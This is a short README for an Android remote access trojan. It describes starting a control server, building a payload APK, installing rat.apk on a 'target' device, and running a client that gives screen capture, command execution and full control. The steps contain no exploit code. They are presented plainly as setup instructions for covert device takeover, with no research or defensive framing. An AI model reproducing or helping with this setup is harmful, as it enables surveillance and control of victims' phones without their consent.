# Advanced RAT Tool Setup

## Instructions:

### Step 1: Set up the Server
1. Go to the `server/` directory.
2. Run `server.py` using the command: `python3 server.py`.
3. Make sure to replace `your_server_ip` and `your_server_port` with the correct values.

### Step 2: Build the Payload
1. Go to the `payloads/` directory.
2. Run `build_payload.sh` using the command: `bash build_payload.sh`.
3. Install the generated `rat.apk` on the target Android device.

### Step 3: Start the RAT Client
1. Go to the `client/` directory.
2. Run `client.py` on the target device using the command: `python3 client.py`.

### Features:
- Screen mirroring (periodic screenshots).
- Command execution (e.g., open apps, send messages).
- Full control over the device (command execution from server).